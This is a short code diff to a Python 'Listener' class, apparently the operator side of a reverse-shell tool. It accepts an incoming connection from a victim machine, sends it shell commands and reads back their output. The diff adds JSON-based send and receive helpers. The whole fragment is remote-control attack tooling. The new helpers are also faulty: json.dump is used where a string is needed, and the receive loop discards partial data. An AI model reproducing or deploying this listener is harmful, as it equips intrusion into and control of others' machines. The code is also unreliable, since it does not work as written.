@@ -1,4 +1,4 @@
-import socket
+import socket, json
 
 class Listener:
     def __init__(self,ip,port):
@@ -10,9 +10,21 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Connection Successful from " + str(address))
     
+    def safe_send(self, data):
+        self.connection.send(json.dump(data))
+    
+    def safe_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = self.connection.recv(1024).decode("UTF-8")
+                return json.loads(json_data)
+            except ValueError:
+                continue
+    
     def execute_commands(self, command):
-        self.connection.send(command.encode())
-        return self.connection.recv(1024).decode("UTF-8")
+        self.safe_send(command)
+        return self.safe_receive()
     
     def run(self):
         while True:
